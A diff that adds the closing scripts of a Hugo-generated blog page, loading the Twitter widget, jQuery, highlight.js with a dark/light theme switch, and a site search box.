+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="/js/jquery.min.js"></script>
+<script src="/js/semantic.min.js"></script>
+<script src="/js/jquery.overlayScrollbars.min.js"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+<script src="/js/html2canvas.min.js"></script>
+<script src="/js/post.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js"></script>
+
+
+
+<script>
+  hljs.initHighlightingOnLoad()
+  setHighlightTheme()
+
+  function setHighlightTheme() {
+    var isDark = localStore.getItem('hugo-theme-dream-is-dark')
+    isDark = isDark ? isDark : window.defaultDark ? 'y' : isDark
+
+    var lightTheme = "tomorrow"
+    var darkTheme = "tomorrow-night"
+    var theme = isDark === 'y' ? darkTheme : lightTheme
+
+    $('link[data-highlight]').attr('href', 'https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/' + theme + '.min.css')
+    $('pre').css('background', isDark === 'y' ? '#333' : '')
+  }
+</script>
+
+
+
+
+
+    
+    <div class="ui inverted segment" id="dream-search">
+  <div class="ui search">
+    <div class="ui transparent input">
+      <input class="prompt" type="text" placeholder="Search" />
+    </div>
+    <div class="results"></div>
+  </div>
+</div>
+<script>
+  $(document).ready(function () {
+    $.getJSON('http:\/\/localhost:1313\//index.json', function (data) {
+      $('.ui.search').search({
+        source: data,
+        searchFields: ['title'],
+        showNoResults: true,
+      })
+    })
+  })
+</script>
+<script src="/js/search.js"></script>
+
+    
+
+    
+
+    
+  </body>
+</html>
